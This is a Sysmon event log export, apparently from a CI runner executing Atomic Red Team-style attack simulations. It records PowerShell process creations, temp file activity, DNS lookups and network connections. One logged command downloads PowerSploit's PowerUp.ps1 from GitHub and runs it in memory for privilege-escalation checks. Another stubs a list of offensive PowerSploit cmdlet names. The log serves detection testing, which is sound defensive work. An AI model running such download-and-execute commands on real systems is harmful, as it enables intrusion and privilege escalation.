"12/17/2025 7:53:58 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:58.417
ProcessGuid: {f995aebf-6196-6942-e002-000000000e00}
ProcessId: 6496
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ggniiak1.j5z.ps1
CreationUtcTime: 2025-12-17 07:53:58.417
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:58 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:58.127
ProcessGuid: {f995aebf-6195-6942-de02-000000000e00}
ProcessId: 7356
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\Temp\art-marker.txt
Hashes: SHA256=BBA3706E6CE40F5F64A0AE1E5560BFE606196419FC225A841E479F89035E5B3A
IsExecutable: false
Archived: true"
"12/17/2025 7:53:57 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:57.944
ProcessGuid: {f995aebf-6195-6942-de02-000000000e00}
ProcessId: 7356
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mookz0kq.dtc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:57 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:57.924
ProcessGuid: {f995aebf-6195-6942-de02-000000000e00}
ProcessId: 7356
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_mookz0kq.dtc.ps1
CreationUtcTime: 2025-12-17 07:53:57.922
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:56.707
ProcessGuid: {f995aebf-6194-6942-d402-000000000e00}
ProcessId: 7848
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wsi5dvrq.nd2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:56 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:56.686
ProcessGuid: {f995aebf-6194-6942-d402-000000000e00}
ProcessId: 7848
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wsi5dvrq.nd2.ps1
CreationUtcTime: 2025-12-17 07:53:56.686
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:56 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:56.214
ProcessGuid: {f995aebf-6194-6942-d202-000000000e00}
ProcessId: 5372
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_knklko1h.oj2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:56 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:56.194
ProcessGuid: {f995aebf-6194-6942-d202-000000000e00}
ProcessId: 5372
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_knklko1h.oj2.ps1
CreationUtcTime: 2025-12-17 07:53:56.194
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:55 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:55.721
ProcessGuid: {f995aebf-6193-6942-d002-000000000e00}
ProcessId: 9140
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0icpp0yq.amh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:55 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:55.702
ProcessGuid: {f995aebf-6193-6942-d002-000000000e00}
ProcessId: 9140
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0icpp0yq.amh.ps1
CreationUtcTime: 2025-12-17 07:53:55.702
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:51 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:51.181
ProcessGuid: {f995aebf-618f-6942-c902-000000000e00}
ProcessId: 9044
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_uxzssxb3.r24.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:51 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:51.160
ProcessGuid: {f995aebf-618f-6942-c902-000000000e00}
ProcessId: 9044
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_uxzssxb3.r24.ps1
CreationUtcTime: 2025-12-17 07:53:51.159
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:47 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:47.407
ProcessGuid: {f995aebf-618b-6942-c602-000000000e00}
ProcessId: 4136
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lvx20gih.0ag.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:47 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:47.385
ProcessGuid: {f995aebf-618b-6942-c602-000000000e00}
ProcessId: 4136
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lvx20gih.0ag.ps1
CreationUtcTime: 2025-12-17 07:53:47.383
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:46.961
ProcessGuid: {f995aebf-618a-6942-c402-000000000e00}
ProcessId: 7248
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hz0h02bc.fgw.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:46 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:46.940
ProcessGuid: {f995aebf-618a-6942-c402-000000000e00}
ProcessId: 7248
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hz0h02bc.fgw.ps1
CreationUtcTime: 2025-12-17 07:53:46.940
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:53:46.709
ProcessGuid: {f995aebf-618a-6942-c102-000000000e00}
ProcessId: 9248
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_r03t2135.cns.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:53:46 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:53:46.687
ProcessGuid: {f995aebf-618a-6942-c102-000000000e00}
ProcessId: 9248
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_r03t2135.cns.ps1
CreationUtcTime: 2025-12-17 07:53:46.687
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:53:45 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:53:45.056
ProcessGuid: {f995aebf-60ef-6942-6402-000000000e00}
ProcessId: 5464
Image: C:\Windows\System32\wbem\WmiPrvSE.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\NETWORK SERVICE"
"12/17/2025 7:52:11 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:52:11.192
ProcessGuid: {f995aebf-5f6d-6942-a300-000000000e00}
ProcessId: 5996
Image: C:\Windows\System32\taskhostw.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:52:06 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:52:06.260
ProcessGuid: {f995aebf-6121-6942-ac02-000000000e00}
ProcessId: 6668
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7010_none_a54d8be7772fd084\TiWorker.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:52:05 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:52:05.850
ProcessGuid: {f995aebf-6121-6942-ac02-000000000e00}
ProcessId: 6668
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7010_none_a54d8be7772fd084\TiWorker.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:52:05 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:52:05.381
ProcessGuid: {f995aebf-6121-6942-ac02-000000000e00}
ProcessId: 6668
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7010_none_a54d8be7772fd084\TiWorker.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:52:05 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:52:05.039
ProcessGuid: {f995aebf-6121-6942-ac02-000000000e00}
ProcessId: 6668
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7010_none_a54d8be7772fd084\TiWorker.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:52:03 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:52:03.211
ProcessGuid: {f995aebf-6121-6942-ac02-000000000e00}
ProcessId: 6668
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7010_none_a54d8be7772fd084\TiWorker.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:52:02 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:52:02.007
ProcessGuid: {f995aebf-6121-6942-ac02-000000000e00}
ProcessId: 6668
Image: C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26100.7010_none_a54d8be7772fd084\TiWorker.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:59 AM","9","RawAccessRead detected:
RuleName: RawAccessRead
UtcTime: 2025-12-17 07:51:59.023
ProcessGuid: {f995aebf-5f6d-6942-a300-000000000e00}
ProcessId: 5996
Image: C:\Windows\system32\taskhostw.exe
Device: \Device\HarddiskVolume2
User: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:57 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:57.008
ProcessGuid: {f995aebf-611d-6942-9502-000000000e00}
ProcessId: 7980
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.26100.4484 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: ""C:\Windows\system32\sc.exe"" start pushtoinstall registration
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {f995aebf-5f5c-6942-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA256=A452BFCB6000D03942DDFADDCDA5A7EB121447ED99B1BA090446B4A989F1F7AE
ParentProcessGuid: {f995aebf-5f5f-6942-3100-000000000e00}
ParentProcessId: 2648
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"
"12/17/2025 7:51:48 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:51:46.659
ProcessGuid: {f995aebf-6110-6942-9302-000000000e00}
ProcessId: 4508
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:48 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:51:45.256
ProcessGuid: {f995aebf-6110-6942-9302-000000000e00}
ProcessId: 4508
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:47 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:51:45.265
ProcessGuid: {f995aebf-6110-6942-9302-000000000e00}
ProcessId: 4508
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53240
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:51:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:45.025
ProcessGuid: {f995aebf-6110-6942-9302-000000000e00}
ProcessId: 4508
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pbyf0yq3.wcu.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:45 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:51:45.007
ProcessGuid: {f995aebf-6110-6942-9302-000000000e00}
ProcessId: 4508
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_pbyf0yq3.wcu.ps1
CreationUtcTime: 2025-12-17 07:51:45.007
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:44.928
ProcessGuid: {f995aebf-6110-6942-9302-000000000e00}
ProcessId: 4508
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)
Invoke-AllChecks}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:44.605
ProcessGuid: {f995aebf-6110-6942-9102-000000000e00}
ProcessId: 9724
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xzyz2cv5.3ul.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:44 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:51:44.585
ProcessGuid: {f995aebf-6110-6942-9102-000000000e00}
ProcessId: 9724
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_xzyz2cv5.3ul.ps1
CreationUtcTime: 2025-12-17 07:51:44.585
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:44.505
ProcessGuid: {f995aebf-6110-6942-9102-000000000e00}
ProcessId: 9724
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$malcmdlets = \""""Add-Persistence\"""", \""""Find-AVSignature\"""", \""""Get-GPPAutologon\"""", \""""Get-GPPPassword\"""", \""""Get-HttpStatus\"""", \""""Get-Keystrokes\"""", \""""Get-SecurityPackages\"""", \""""Get-TimedScreenshot\"""", \""""Get-VaultCredential\"""", \""""Get-VolumeShadowCopy\"""", \""""Install-SSP\"""", \""""Invoke-CredentialInjection\"""", \""""Invoke-DllInjection\"""", \""""Invoke-Mimikatz\"""", \""""Invoke-NinjaCopy\"""", \""""Invoke-Portscan\"""", \""""Invoke-ReflectivePEInjection\"""", \""""Invoke-ReverseDnsLookup\"""", \""""Invoke-Shellcode\"""", \""""Invoke-TokenManipulation\"""", \""""Invoke-WmiCommand\"""", \""""Mount-VolumeShadowCopy\"""", \""""New-ElevatedPersistenceOption\"""", \""""New-UserPersistenceOption\"""", \""""New-VolumeShadowCopy\"""", \""""Out-CompressedDll\"""", \""""Out-EncodedCommand\"""", \""""Out-EncryptedScript\"""", \""""Out-Minidump\"""", \""""PowerUp\"""", \""""PowerView\"""", \""""Remove-Comments\"""", \""""Remove-VolumeShadowCopy\"""", \""""Set-CriticalProcess\"""", \""""Set-MasterBootRecord\""""

foreach ($cmdlets in $malcmdlets) {
    \""""function $cmdlets { Write-Host Pretending to invoke $cmdlets }\""""}
foreach ($cmdlets in $malcmdlets) {
    $cmdlets}}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:44.044
ProcessGuid: {f995aebf-610f-6942-9002-000000000e00}
ProcessId: 9512
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gkfgkfje.2as.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:44 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:51:44.025
ProcessGuid: {f995aebf-610f-6942-9002-000000000e00}
ProcessId: 9512
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gkfgkfje.2as.ps1
CreationUtcTime: 2025-12-17 07:51:44.025
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:43.431
ProcessGuid: {f995aebf-610f-6942-8c02-000000000e00}
ProcessId: 8012
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lpunragc.kj2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:51:43.413
ProcessGuid: {f995aebf-610f-6942-8c02-000000000e00}
ProcessId: 8012
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lpunragc.kj2.ps1
CreationUtcTime: 2025-12-17 07:51:43.413
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:43.337
ProcessGuid: {f995aebf-610f-6942-8c02-000000000e00}
ProcessId: 8012
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -UseEncodedArguments -EncodedArgumentsParamVariation EncodedArguments -Execute -ErrorAction Stop}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:42.870
ProcessGuid: {f995aebf-610e-6942-8a02-000000000e00}
ProcessId: 8424
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tplaxquw.0gh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:51:42.853
ProcessGuid: {f995aebf-610e-6942-8a02-000000000e00}
ProcessId: 8424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_tplaxquw.0gh.ps1
CreationUtcTime: 2025-12-17 07:51:42.853
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:42.772
ProcessGuid: {f995aebf-610e-6942-8a02-000000000e00}
ProcessId: 8424
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -EncodedCommandParamVariation E -Execute -ErrorAction Stop}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:51:42.303
ProcessGuid: {f995aebf-610e-6942-8802-000000000e00}
ProcessId: 8228
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nobwqir1.s4p.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:51:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:51:42.281
ProcessGuid: {f995aebf-610e-6942-8802-000000000e00}
ProcessId: 8228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nobwqir1.s4p.ps1
CreationUtcTime: 2025-12-17 07:51:42.281
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:51:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:51:42.202
ProcessGuid: {f995aebf-610e-6942-8802-000000000e00}
ProcessId: 8228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType Hyphen -CommandParamVariation C -UseEncodedArguments -EncodedArgumentsParamVariation EA -Execute -ErrorAction Stop}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
